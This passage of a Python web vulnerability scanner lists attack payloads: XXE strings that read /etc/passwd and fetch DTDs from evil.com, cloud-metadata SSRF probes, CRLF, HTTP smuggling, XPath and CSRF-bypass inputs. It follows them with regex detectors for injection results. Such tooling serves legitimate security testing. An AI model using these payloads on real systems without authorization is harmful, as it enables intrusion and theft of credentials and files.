        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]><x/>',
        # ── CDATA exfil (bypass output encoding) ────────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://evil.com/cdata.dtd">%dtd;]><x>&all;</x>',
        # ── Error-based XXE (parser error leaks file content) ────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]><x/>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]><x/>',
        # ── XInclude (when you can't control DOCTYPE) ────────────────────
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///C:/Windows/win.ini"/></foo>',
        # ── SVG XXE (image upload vector) ────────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg"><text font-size="16">&xxe;</text></svg>',
        # ── SOAP XXE ─────────────────────────────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
        # ── PHP wrapper vectors ──────────────────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=../config.php">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "expect://id">]><x>&xxe;</x>',
        # ── Java-specific (jar: protocol, netdoc:) ──────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "jar:file:///tmp/evil.jar!/evil.txt">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "jar:http://evil.com/evil.jar!/config.properties">]><x>&xxe;</x>',
        # ── .NET-specific (UNC path) ─────────────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:////evil.com/share/xxe.txt">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "\\\\evil.com\\share\\xxe.txt">]><x>&xxe;</x>',
        # ── Encoding bypass — UTF-7 ─────────────────────────────────────
        '<?xml version="1.0" encoding="UTF-7"?>+ADw-!DOCTYPE x +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-x+AD4-+ACY-xxe;+ADw-/x+AD4-',
        # ── Encoding bypass — UTF-16 BE ──────────────────────────────────
        '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
        # ── Billion laughs DoS detection (small version) ─────────────────
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>',
        # ── DOCTYPE with PUBLIC identifier ───────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE foo PUBLIC "-//OASIS//DTD Entity Resolution XML Catalog V1.0//EN" "http://evil.com/xxe.dtd"><foo/>',
        # ── SSRF via XXE (cloud metadata) ────────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://100.100.100.200/latest/meta-data/">]><x>&xxe;</x>',
        # ── Recursive entity (parser bomb — gentler) ─────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "a"><!ENTITY b "&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;">]><x>&c;</x>',
        # ── No-declaration entity (some parsers accept) ──────────────────
        '<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
    ],

    "header_injection": [
        # Basic CRLF header injection
        "\r\nX-Injected: header",
        "%0d%0aX-Injected: header",
        "%0aX-Injected: header",
        "\nSet-Cookie: evil=1",
        "%0d%0aSet-Cookie: evil=1",
        "\r\nLocation: https://evil.com",
        # HTTP response splitting — inject full HTTP response
        "\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>split</html>",
        "%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>split</html>",
        # Double CRLF body injection
        "\r\n\r\n<script>alert(1)</script>",
        "%0d%0a%0d%0a<script>alert(1)</script>",
        # Header injection variants
        "\r\nX-Forwarded-For: 127.0.0.1",
        "\r\nHost: evil.com",
        "%0d%0aContent-Length: 0%0d%0a%0d%0a",
        # Unicode line separator / paragraph separator
        "\u2028X-Injected: header",
        "\u2029X-Injected: header",
        # Null byte + CRLF combo
        "\x00\r\nX-Injected: header",
        # Encoded variants
        "%E5%98%8A%E5%98%8DX-Injected: header",  # UTF-8 overlong \r\n
        "%c0%8d%c0%8aX-Injected: header",          # overlong UTF-8 \r\n
    ],

    "crlf_injection": [
        "%0d%0a",
        "%0a",
        "\r\n",
        "%0d%0aSet-Cookie:evil=1",
        "test%0d%0aInjected: header",
        # Additional encoded forms
        "%0d%0a%20",                                # CRLF + space (header folding)
        "%0d%0aTransfer-Encoding:%20chunked",       # response splitting via TE
        "\r\nContent-Type: text/html\r\n\r\nPWNED",  # full body injection
        "%0d%0aX-XSS-Protection:%200",              # disable XSS protection
        "%0d%0aAccess-Control-Allow-Origin:%20*",   # inject permissive CORS
        "%E5%98%8A%E5%98%8D",                       # overlong UTF-8 CRLF
        "%c0%8d%c0%8a",                             # another overlong variant
    ],

    "prototype_pollution": [
        "__proto__[x]=1",
        "constructor.prototype.x=1",
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        "a[__proto__][isAdmin]=1",
        "__proto__.isAdmin=true",
        "__proto__[polluted]=yes",
        "constructor[prototype][isAdmin]=true",
    ],

    "exceptional_conditions": [
        "",                    # empty string
        " " * 10000,           # huge input (10k spaces)
        "\x00",                # null byte
        "\xff\xfe",            # invalid UTF-8 sequence
        "𝕳𝖊𝖑𝖑𝖔",        # special Unicode (mathematical script)
        "-1",                  # negative number
        "9" * 100,             # integer overflow candidate
        "true",                # boolean confusion
        "null",                # null literal
        "undefined",           # JS undefined
        "[]",                  # empty array literal
        "{}",                  # empty object literal
        "<\x00script>",        # null byte in HTML tag
        "NaN",                 # not-a-number
        "Infinity",            # float overflow
    ],

    # ── Buffer Overflow / Memory Corruption ─────────────────────────────
    "buffer_overflow": [
        # Long string payloads (safe sizes — max 64KB per ISC-A1)
        "A" * 1024,            # 1 KB
        "A" * 4096,            # 4 KB
        "A" * 8192,            # 8 KB
        "A" * 16384,           # 16 KB
        "A" * 65536,           # 64 KB
        "B" * 4096,            # different char for pattern matching
        # Format string attacks (C/C++ backend detection)
        "%x" * 50,             # heap leak via format string
        "%n" * 20,             # write-what-where via format string
        "%s" * 50,             # string pointer dereference
        "%p" * 50,             # pointer leak
        "AAAA" + "%08x." * 20, # stack walk
        "%d" * 100,            # integer format leak
        # Integer overflow boundaries
        "2147483647",          # INT_MAX (32-bit)
        "2147483648",          # INT_MAX + 1
        "-2147483649",         # INT_MIN - 1
        "4294967295",          # UINT_MAX (32-bit)
        "4294967296",          # UINT_MAX + 1
        "9223372036854775807", # LONG_MAX (64-bit)
        # Deep nesting (stack exhaustion)
        "{" * 512,             # deeply nested JSON-like
        "[" * 512,             # deeply nested array-like
        "(" * 512,             # deeply nested parens
        # Null byte injection (off-by-one / truncation)
        "A" * 256 + "\x00" + "B" * 256,
        "\x00" * 1024,         # null sled
    ],

    # ── XPath Injection ─────────────────────────────────────────────────
    "xpath_injection": [
        # Boolean-based XPath injection
        "' or '1'='1",
        "' or ''='",
        "' and '1'='1",
        "1' or '1'='1' or '1'='1",
        # Error-based XPath extraction
        "' or 1=1]|//|//*['",
        "' or count(//*)>0 or '1'='1",
        "' or string-length(name(/*))>0 or '1'='1",
        # XPath axis navigation
        "' or //user[1]/password or '1'='1",
        "' or name(/*)='root' or '1'='1",
        "' or //*[contains(.,'admin')] or '1'='1",
        # Authentication bypass
        "admin' or '1'='1",
        "' or 1=1 or ''='",
        "x']|//user/*|//user['x",
        # Node extraction
        "' or substring(//user[1]/password,1,1)='a' or '1'='1",
        "') or ('1'='1",
        "'] | //* | //*['",
    ],

    # ── IDOR / Broken Access Control ─────────────────────────────────────
    # Note: these are STATIC fallback IDs. The _fuzz_idor() method generates
    # dynamic payloads (original_value ± 1) at runtime for numeric params.
    "idor": [
        # ── Numeric ID enumeration ───────────────────────────────────────
        "0",
        "1",
        "2",
        "100",
        "999",
        "1000",
        "9999",
        "-1",
        "00",                                   # Leading zero
        "01",
        # ── UUID guessing (common test values) ───────────────────────────
        "00000000-0000-0000-0000-000000000000",  # Nil UUID
        "11111111-1111-1111-1111-111111111111",
        # ── String ID manipulation ───────────────────────────────────────
        "admin",
        "root",
        "test",
        "guest",
        "user",
        "system",
        "null",
        "undefined",
        # ── Path traversal in ID context ─────────────────────────────────
        "../1",
        "..%2F1",
        "1/../../admin",
    ],

    # ── Access Control Bypass Headers ────────────────────────────────────
    "acl_bypass": [
        # ── Path override headers ────────────────────────────────────────
        "/admin",                               # X-Original-URL value
        "/admin/",
        "/api/admin",
        "/api/users",
        "/internal",
        "/actuator",
        "/actuator/env",
        "/management",
        "/swagger-ui.html",
        "/graphql",
        "/debug",
        "/console",
        "/../admin",
        "/%2e%2e/admin",
    ],

    # ── HTTP Request Smuggling Probes ──────────────────────────────────────
    # Each entry is a dict with: name, headers (dict), body (str), technique
    # These are NOT flat payload strings — they need structured CL/TE combos.
    # Detection is via status code anomaly, timeout, or response confusion.
    "http_smuggling": [
        # ── CL.TE: Frontend uses Content-Length, backend uses Transfer-Encoding ──
        {"name": "CL.TE basic",
         "technique": "CL.TE",
         "headers": {"Content-Length": "6", "Transfer-Encoding": "chunked"},
         "body": "0\r\n\r\nG"},
        {"name": "CL.TE extended prefix",
         "technique": "CL.TE",
         "headers": {"Content-Length": "11", "Transfer-Encoding": "chunked"},
         "body": "0\r\n\r\nGET / H"},
        {"name": "CL.TE with POST prefix",
         "technique": "CL.TE",
         "headers": {"Content-Length": "13", "Transfer-Encoding": "chunked"},
         "body": "0\r\n\r\nPOST / H"},
        {"name": "CL.TE oversized CL",
         "technique": "CL.TE",
         "headers": {"Content-Length": "100", "Transfer-Encoding": "chunked"},
         "body": "0\r\n\r\n"},
        {"name": "CL.TE zero chunk immediate",
         "technique": "CL.TE",
         "headers": {"Content-Length": "5", "Transfer-Encoding": "chunked"},
         "body": "0\r\n\r\n"},
        # ── TE.CL: Frontend uses Transfer-Encoding, backend uses Content-Length ──
        {"name": "TE.CL basic",
         "technique": "TE.CL",
         "headers": {"Transfer-Encoding": "chunked", "Content-Length": "4"},
         "body": "5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"},
        {"name": "TE.CL short CL",
         "technique": "TE.CL",
         "headers": {"Transfer-Encoding": "chunked", "Content-Length": "3"},
         "body": "1\r\nG\r\n0\r\n\r\n"},
        {"name": "TE.CL method line inject",
         "technique": "TE.CL",
         "headers": {"Transfer-Encoding": "chunked", "Content-Length": "6"},
         "body": "0\r\n\r\nX"},
        {"name": "TE.CL pipeline probe",
         "technique": "TE.CL",
         "headers": {"Transfer-Encoding": "chunked", "Content-Length": "0"},
         "body": "1\r\nZ\r\n0\r\n\r\n"},
        # ── TE.TE: Both use TE, but obfuscation confuses one side ──
        {"name": "TE.TE xchunked",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "xchunked", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE leading space",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": " chunked", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE trailing space",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "chunked ", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE tab prefix",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "\tchunked", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE null byte",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "chunked\x00", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE mixed case chunKed",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "chunKed", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE CHUNKED uppercase",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "CHUNKED", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE identity,chunked",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "identity, chunked", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE chunked,identity",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "chunked, identity", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE line folding via comma",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "chunked,", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE vertical tab",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "\x0bchunked", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE double TE via raw socket",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "chunked", "Transfer-encoding": "x"},
         "body": "0\r\n\r\nG"},
        # ── CL.CL: Double Content-Length (proxy uses first, backend uses second) ──
        {"name": "CL.CL double length",
         "technique": "CL.CL",
         "headers": {"Content-Length": "6", "Content-length": "0"},
         "body": "0\r\n\r\nG"},
        {"name": "CL.CL reversed case",
         "technique": "CL.CL",
         "headers": {"Content-length": "0", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        # ── Timing-based differential (detect desync via response timing) ──
        {"name": "CL.TE timing probe",
         "technique": "CL.TE_timing",
         "headers": {"Content-Length": "4", "Transfer-Encoding": "chunked"},
         "body": "1\r\nA\r\n0\r\n\r\n"},
        {"name": "TE.CL timing probe",
         "technique": "TE.CL_timing",
         "headers": {"Transfer-Encoding": "chunked", "Content-Length": "6"},
         "body": "0\r\n\r\n"},
    ],

    # ── CSRF Bypass Techniques ─────────────────────────────────────────────
    # Each entry describes a bypass technique to test against forms.
    # The _fuzz_csrf method fetches a form, extracts the token, then
    # resubmits using each bypass technique to see if the server accepts it.
    "csrf": [
        # ── Token manipulation ──────────────────────────────────────────────
        {"name": "Token removal",
         "technique": "token_remove",
         "description": "Submit form with CSRF token field completely removed"},
        {"name": "Empty token",
         "technique": "token_empty",
         "description": "Submit form with CSRF token set to empty string"},
        {"name": "Random token",
         "technique": "token_random",
         "description": "Submit form with a random/invalid CSRF token value"},
        {"name": "Null token",
         "technique": "token_null",
         "description": "Submit form with CSRF token set to literal 'null'"},
        {"name": "Static token reuse",
         "technique": "token_static",
         "description": "Submit form with a hardcoded static token value"},
        {"name": "Short token",
         "technique": "token_short",
         "description": "Submit form with a truncated token (first 4 chars)"},
        # ── Header bypass ───────────────────────────────────────────────────
        {"name": "No Referer header",
         "technique": "no_referer",
         "description": "Submit form without Referer header"},
        {"name": "Wrong Referer",
         "technique": "wrong_referer",
         "description": "Submit form with Referer pointing to attacker domain"},
        {"name": "Null Origin",
         "technique": "null_origin",
         "description": "Submit form with Origin: null header"},
        {"name": "Wrong Origin",
         "technique": "wrong_origin",
         "description": "Submit form with Origin pointing to attacker domain"},
        {"name": "Origin subdomain spoof",
         "technique": "origin_subdomain",
         "description": "Submit form with Origin as subdomain of target"},
        # ── Method override ─────────────────────────────────────────────────
        {"name": "GET method override",
         "technique": "method_get",
         "description": "Convert POST form to GET with params in query string"},
        {"name": "X-HTTP-Method-Override",
         "technique": "method_override_header",
         "description": "POST with X-HTTP-Method-Override: GET header"},
        {"name": "_method=GET override",
         "technique": "method_override_param",
         "description": "Add _method=GET parameter to POST body"},
        # ── Content-Type bypass ─────────────────────────────────────────────
        {"name": "text/plain Content-Type",
         "technique": "content_type_plain",
         "description": "Submit with text/plain (bypasses CORS preflight)"},
        {"name": "multipart/form-data",
         "technique": "content_type_multipart",
         "description": "Submit as multipart/form-data instead of urlencoded"},
        # ── Combined bypass ─────────────────────────────────────────────────
        {"name": "Token removal + null Origin",
         "technique": "combo_remove_null_origin",
         "description": "Remove token AND set Origin: null simultaneously"},
        {"name": "Token removal + no Referer + text/plain",
         "technique": "combo_remove_no_referer_plain",
         "description": "Remove token, strip Referer, use text/plain"},
    ],
}

# Detection signatures per vuln class
DETECTORS: dict[str, list[tuple[str, str]]] = {
    "sqli_error": [
        # MySQL / MariaDB
        (r"you have an error in your sql", "MySQL error — SQL injection likely confirmed"),
        (r"warning: mysql_", "PHP MySQL error — SQL injection point exposed"),
        (r"supplied argument is not a valid MySQL", "MySQL injection error"),
        (r"mysql_num_rows\(\)", "PHP MySQL function exposed"),
        (r"Column count doesn't match", "MySQL UNION injection — column count mismatch"),
        (r"Unknown column '.*' in", "MySQL unknown column — injection confirmed"),
        (r"Table '.*' doesn't exist", "MySQL table error — injection point"),
        (r"MariaDB server version", "MariaDB error — SQL injection confirmed"),
        # PostgreSQL
        (r"PSQLException",   "PostgreSQL error — SQL injection likely confirmed"),
        (r"pg_query\(\)",    "PostgreSQL query error — injection point"),
        (r"unterminated quoted string", "PostgreSQL syntax error — injection confirmed"),
        (r"ERROR:\s+syntax error at or near", "PostgreSQL syntax error — injection point"),
        (r"invalid input syntax for (?:type\s+)?(?:integer|numeric)", "PostgreSQL type cast error — injection"),
        # Oracle
        (r"ORA-\d+",         "Oracle DB error — SQL injection likely confirmed"),
        (r"oracle.*driver",  "Oracle driver error — injection point"),
        (r"quoted string not properly terminated", "Oracle syntax error — injection"),
        # MSSQL
        (r"Microsoft SQL.*Native Client", "MSSQL error — SQL injection confirmed"),
        (r"Unclosed quotation mark",      "MSSQL syntax error — SQL injection confirmed"),
        (r"ODBC SQL Server Driver",       "MSSQL ODBC error — injection confirmed"),
        (r"SQL Server.*?\d+",             "MSSQL server error — injection point"),
        (r"Incorrect syntax near",        "MSSQL syntax error — injection confirmed"),
        # SQLite
        (r"sqlite_",         "SQLite error — SQL injection likely confirmed"),
        (r"SQLITE_ERROR",    "SQLite error code — injection confirmed"),
        (r"near \".*\": syntax error", "SQLite syntax error — injection point"),
        # DB2
        (r"DB2 SQL error",   "IBM DB2 error — SQL injection confirmed"),
        (r"SQLCODE=-\d+",    "DB2 SQLCODE error — injection point"),
        # H2 / CockroachDB / Firebird / Informix / Sybase
        (r"org\.h2\.jdbc",   "H2 Database error — injection confirmed"),
        (r"node is not ready", "CockroachDB error — injection point"),
        (r"Dynamic SQL Error", "Firebird SQL error — injection confirmed"),
        (r"com\.informix\.jdbc", "Informix JDBC error — injection point"),
        (r"Sybase message",  "Sybase error — injection confirmed"),
        # Framework / driver errors
        (r"java\.sql\.SQLException", "JDBC exception — SQL injection point"),
        (r"SQLSTATE\[\w+\]", "PDO/ODBC SQLSTATE error — injection confirmed"),
        (r"PG::SyntaxError", "Ruby pg gem — PostgreSQL injection error"),
        (r"ActiveRecord::StatementInvalid", "Rails SQL error — injection confirmed"),
        (r"django\.db\.utils", "Django ORM SQL error — injection point"),
        (r"System\.Data\.SqlClient", "ASP.NET SQL error — injection confirmed"),
        (r"Microsoft OLE DB Provider", "OLE DB provider error — injection"),
        (r"sql syntax.*?error", "Generic SQL syntax error — injection point"),
        # MongoDB / NoSQL
        (r"MongoError",      "MongoDB error — NoSQL injection confirmed"),
        (r"\$err.*?not.*?valid", "MongoDB query error — NoSQL injection point"),
    ],
    "xss_stored":      [],  # detected by canary verification (inject → re-fetch)
    "sqli_bool_true":  [],  # detected by differential response analysis
    "sqli_bool_false": [],  # detected by differential response analysis
    "sqli_blind_time": [],  # detected by response time delta
    "xss_reflected": [
        # Script tag variants
        (r"<script[^>]*>alert\(1\)</script>",  "Reflected XSS confirmed — script tag unescaped"),
        (r"<script[^>]*>confirm\(1\)</script>", "Reflected XSS confirmed — confirm() reflected"),
        (r"<script[^>]*>prompt\(1\)</script>",  "Reflected XSS confirmed — prompt() reflected"),
        (r"<script[^>]*>alert`1`</script>",     "Reflected XSS confirmed — backtick invocation"),
        (r"<script\s+src=",                     "Reflected XSS — external script injection"),
        # Event handler variants
        (r"onerror\s*=\s*alert\(1\)",           "Reflected XSS confirmed — onerror unescaped"),
        (r"onload\s*=\s*alert\(1\)",            "Reflected XSS — onload handler reflected"),
        (r"onfocus\s*=\s*alert\(1\)",           "Reflected XSS — onfocus handler reflected"),
        (r"onmouseover\s*=\s*alert\(1\)",       "Reflected XSS — onmouseover reflected"),
        (r"ontoggle\s*=\s*alert\(1\)",          "Reflected XSS — ontoggle reflected"),
        (r"onbegin\s*=\s*alert\(1\)",           "Reflected XSS — SVG animate onbegin reflected"),
        (r"onstart\s*=\s*alert\(1\)",           "Reflected XSS — marquee onstart reflected"),
        # Tag-specific
        (r"<svg[/\s]onload",                    "Reflected XSS — SVG onload tag reflected"),
        (r"<img[/\s][^>]*onerror",              "Reflected XSS — img onerror tag reflected"),
        (r"<iframe[^>]*srcdoc",                 "Reflected XSS — iframe srcdoc injection"),
        (r"<embed[^>]*src\s*=\s*javascript:",   "Reflected XSS — embed javascript: src"),
        # Protocol handlers
        (r"javascript:\s*alert\(1\)",           "Reflected XSS — javascript: URI reflected"),
        (r"javascript:\s*alert\(document",      "Reflected XSS — javascript: domain/cookie steal"),
        (r"data:text/html",                     "Reflected XSS — data: URI injection"),
        # Framework template injection
        (r"\{\{.*constructor.*\}\}",            "Reflected XSS — AngularJS template injection"),
        (r"\{\{alert\(1\)\}\}",                 "Template XSS — expression reflected unescaped"),
        # Encoding bypass detection
        (r"&#\d+;.*alert",                      "Reflected XSS — HTML entity encoded payload reflected"),
        (r"\\x3cscript",                        "Reflected XSS — hex escaped script tag reflected"),
    ],
    "lfi": [
        (r"root:x:0:0:",                 "LFI CONFIRMED — /etc/passwd readable"),
        (r"root:\*:0:0:",                "LFI CONFIRMED — /etc/passwd readable"),
        (r"/bin/bash",                   "LFI confirmed — shell path visible"),
        (r"\[fonts\]",                   "LFI CONFIRMED — Windows win.ini readable"),
        (r"\[extensions\]",              "LFI confirmed — Windows ini file readable"),
        (r"PHP Version",                 "LFI to phpinfo — PHP info exposed"),
        (r"daemon:x:",                   "LFI confirmed — /etc/passwd content visible"),
        (r"PATH=/",                      "LFI confirmed — /proc/self/environ readable"),
    ],
    "cmdi": [
        # ── Linux command output ─────────────────────────────────────────
        (r"uid=\d+\(",                          "COMMAND INJECTION CONFIRMED — id output in response"),
        (r"uid=0\(root\)",                      "COMMAND INJECTION AS ROOT — full system compromise"),
        (r"CMDI_CONFIRMED",                     "Command injection confirmed — echo payload returned"),
        (r"(?m)^root\s*$",                      "Command injection confirmed — whoami=root"),
        (r"Linux.*#\d+",                        "Command injection — uname output visible"),
        (r"root:x:0:0:",                        "Command injection — /etc/passwd in response"),
        (r"total \d+\s+drwx",                   "Command injection — ls -la directory listing"),
        (r"/bin/bash|/bin/sh|/usr/sbin/nologin", "Command injection — shell paths in response"),
        (r"(?m)^(www-data|apache|nginx|nobody)", "Command injection — service user whoami"),
        # ── Windows command output ───────────────────────────────────────
        (r"Microsoft Windows",                  "Command injection — Windows version in response"),
        (r"Directory of [A-Z]:\\",              "Command injection — Windows dir listing"),
        (r"\[fonts\]",                          "Command injection — win.ini content visible"),
        (r"Windows IP Configuration",           "Command injection — ipconfig output visible"),
        (r"(?m)^User accounts for",             "Command injection — net user output visible"),
        (r"Subnet Mask.*255\.",                 "Command injection — ipconfig network info leaked"),
        (r"(?m)^Host Name:",                    "Command injection — systeminfo output visible"),
        (r"OS Version:.*Windows",               "Command injection — systeminfo OS version"),
        (r"(?m)^\\\\",                          "Command injection — UNC path in response"),
        # ── PowerShell output ────────────────────────────────────────────
        (r"PSPath\s*:",                         "Command injection — PowerShell object output"),
        (r"(?m)^[A-Z]:\\Users\\",               "Command injection — PowerShell path output"),
        # ── Error-based detection (command not found = still confirms injection) ──
        (r"sh: \d+: .+: not found",            "Command injection — sh error confirms execution"),
        (r"bash: .+: command not found",        "Command injection — bash error confirms execution"),
        (r"'.*' is not recognized as an internal", "Command injection — cmd.exe error confirms execution"),
        (r"The term '.*' is not recognized",    "Command injection — PowerShell error confirms execution"),
        (r"cannot execute binary file",         "Command injection — binary execution attempted"),
    ],
    "ssti": [
        # ── Arithmetic confirmation (all engines) ────────────────────────
        (r"\b49\b",                             "SSTI likely — 7*7=49 arithmetic evaluated"),
        (r"\b7777777\b",                        "SSTI confirmed — 7*'7'='7777777' Jinja2 string repeat"),
        # ── Python engines (Jinja2, Mako, Tornado) ──────────────────────
        (r"<Config ",                           "SSTI — Flask config object leaked"),
        (r"<class '",                           "SSTI — Python class objects exposed"),
        (r"Traceback \(most recent",            "SSTI error — Python traceback visible"),
        (r"__builtins__",                       "SSTI — Python builtins object exposed"),
        (r"<module 'os'",                       "SSTI — Python os module leaked"),
        (r"Mako Runtime Error",                 "SSTI error — Mako template engine"),
        # ── PHP engines (Twig, Smarty) ──────────────────────────────────
        (r"Twig_Error",                         "SSTI error — Twig template engine"),
        (r"Twig\\Error",                        "SSTI error — Twig template (namespaced)"),
        (r"Smarty Compiler:",                   "SSTI error — Smarty template engine"),
        (r"Smarty_Internal_",                   "SSTI — Smarty internal class exposed"),
        (r"Uncaught SmartyException",           "SSTI error — Smarty exception"),
        # ── Java engines (Freemarker, Velocity, Pebble, Thymeleaf, EL) ──
        (r"freemarker\.template\.",             "SSTI error — Freemarker template engine"),
        (r"freemarker\.core\.",                 "SSTI error — Freemarker core"),
        (r"org\.apache\.velocity",              "SSTI error — Velocity template engine"),
        (r"com\.mitchellbosecke\.pebble",       "SSTI error — Pebble template engine"),
        (r"org\.thymeleaf\.exceptions",         "SSTI error — Thymeleaf template engine"),
        (r"javax\.el\.ELException",             "SSTI error — Java EL expression"),
        (r"ognl\.OgnlException",                "SSTI error — OGNL expression (Struts)"),
        (r"java\.lang\.Runtime",                "SSTI — Java Runtime class exposed"),
        (r"java\.lang\.ProcessBuilder",         "SSTI — Java ProcessBuilder exposed"),
        # ── Node.js engines (Pug, Handlebars, Nunjucks, Dust) ───────────
        (r"Template render error",              "SSTI error — Node.js template engine"),
        (r"PugException",                       "SSTI error — Pug/Jade template engine"),
        (r"nunjucks\.runtime\.Error",           "SSTI error — Nunjucks template engine"),
        (r"Handlebars\.Exception",              "SSTI error — Handlebars template engine"),
        (r"dust\.helpers",                      "SSTI — Dust.js helpers exposed"),
        # ── Ruby engines (ERB, Slim) ────────────────────────────────────
        (r"SyntaxError.*erb",                   "SSTI error — ERB template (Ruby)"),
        (r"ActionView::Template::Error",        "SSTI error — Rails template engine"),
        # ── Go templates ────────────────────────────────────────────────
        (r"template: .+: executing",            "SSTI error — Go template engine"),
        (r"html/template:.+error",              "SSTI error — Go html/template"),
        # ── .NET Razor ──────────────────────────────────────────────────
        (r"RazorEngine",                        "SSTI error — .NET Razor engine"),
        (r"System\.Web\.HttpCompileException",  "SSTI error — .NET template compilation"),
        (r"System\.Diagnostics\.Process",       "SSTI — .NET Process class exposed"),
    ],
    "ssrf": [
        (r"ami-id",             "SSRF CONFIRMED — AWS metadata service accessible"),
        (r"instance-id",        "SSRF confirmed — AWS/GCP metadata reachable"),
        (r"iam/security-cred",  "SSRF CRITICAL — AWS IAM credentials accessible"),
        (r"SSH-\d+\.\d+",       "SSRF confirmed — internal SSH service reachable"),
        (r'"computeMetadata"',  "SSRF confirmed — GCP metadata accessible"),
        (r"redis_version",      "SSRF confirmed — internal Redis accessible"),
        (r"elastic",            "SSRF confirmed — internal Elasticsearch accessible"),
    ],
    "open_redirect": [
        # ── Body-based redirect patterns (Location header checked separately) ──
        (r"<meta[^>]*http-equiv\s*=\s*['\"]?refresh[^>]*evil\.com",
